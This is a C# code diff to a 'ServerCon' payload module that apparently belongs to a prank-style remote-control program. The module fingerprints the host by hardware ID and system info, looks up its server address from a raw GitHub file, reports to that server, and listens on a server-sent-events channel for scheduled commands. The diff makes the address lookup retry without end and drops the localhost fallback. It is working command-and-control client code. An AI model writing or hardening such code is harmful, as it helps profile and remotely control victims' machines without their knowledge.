@@ -16,7 +16,6 @@ namespace zort
 {
     public class ServerCon : IPayloadModule
     {
-        private const string DEFAULT_SERVER_URL = "localhost:2256";
         private readonly Thread ServerThread = new Thread(ServerRoutine);
 
         public ElevationType ElevationType => ElevationType.Both;
@@ -44,10 +43,12 @@ namespace zort
                 List<Zort.FartSchedule> fartsAccountedFor = new List<Zort.FartSchedule>();
                 string hwid = SysInfoHelper.HWID();
                 SystemInfo systemInfo = SysInfoHelper.Get();
-                string serverUrl = await GetServerUrlAsync();
 
                 using (HttpClient client = CreateHttpClient())
                 {
+                    string serverUrl = await GetServerUrlWithRetryAsync(client);
+                    ModuleLogger.Log(typeof(ServerCon), $"Server URL: {serverUrl}");
+
                     await SendSystemInfoWithRetryAsync(client, serverUrl, hwid, systemInfo);
                     var sseTask = Task.Run(() => RunSseWithAutoRestartAsync(serverUrl, hwid));
                     while (true)
@@ -94,43 +95,33 @@ namespace zort
             return new HttpClient(handler);
         }
 
-        private static async Task<string> GetServerUrlAsync()
+        private static async Task<string> GetServerUrlWithRetryAsync(HttpClient client)
         {
             const string githubUrl = "https://raw.githubusercontent.com/ZKitap/zortie/refs/heads/main/server.dat";
-            const string defaultServerUrl = "https://localhost:2256";
-
-            using (var client = new HttpClient())
+            while (true)
             {
                 try
                 {
                     var response = await client.GetAsync(githubUrl);
                     if (response.IsSuccessStatusCode)
                     {
-                        //Add http:// to the URL if it doesn't already exist
                         string serverUrl = await response.Content.ReadAsStringAsync();
+                        serverUrl = serverUrl.Trim();
+                        serverUrl = serverUrl.TrimEnd('/');
                         if (!serverUrl.StartsWith("http://") && !serverUrl.StartsWith("https://"))
                         {
                             serverUrl = "https://" + serverUrl;
                         }
 
-                        // Check if the URL is valid
-                        var uri = new Uri(serverUrl);
-                        if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
-                        {
-                            ModuleLogger.Log(typeof(ServerCon), "Invalid server URL scheme.");
-                            return defaultServerUrl;
-                        }
                         return serverUrl;
                     }
-                    else
-                        ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
+                    else ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
                 }
                 catch (Exception ex)
                 {
                     ModuleLogger.Log(typeof(ServerCon), $"Error fetching server URL from GitHub: {ex.Message}");
                 }
             }
-            return defaultServerUrl;
         }
 
         private static async Task SendSystemInfoWithRetryAsync(HttpClient client, string serverUrl, string hwid, SystemInfo info)
@@ -218,7 +209,7 @@ namespace zort
                     {
                         ModuleLogger.Log(typeof(ServerCon), $"Failed to parse SSE fart data: {ex.Message}");
                     }
-                    catch(OperationAbortedException ex)
+                    catch (OperationAbortedException ex)
                     {
                         ModuleLogger.Log(typeof(ServerCon), $"SSE connection aborted: {ex.Message}");
                         break;
@@ -301,9 +292,18 @@ namespace zort
                 var requestUrl = $"{url}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
                 foreach (var property in data.GetType().GetProperties())
                 {
-                    requestUrl += $"{property.Name}={property.GetValue(data)}&";
+                    var name = Uri.EscapeDataString(property.Name);
+                    var value = Uri.EscapeDataString(property.GetValue(data)?.ToString() ?? "");
+                    requestUrl += $"{name}={value}&"; ;
                 }
                 requestUrl = requestUrl.TrimEnd('&');
+
+                if (!Uri.TryCreate(requestUrl, UriKind.Absolute, out Uri validatedUri))
+                {
+                    Console.WriteLine("Invalid URI: " + requestUrl);
+                }
+
+                Console.WriteLine($"Sending request to: {requestUrl}");
 
                 // Send the POST request
                 HttpResponseMessage response = await client.GetAsync(requestUrl);
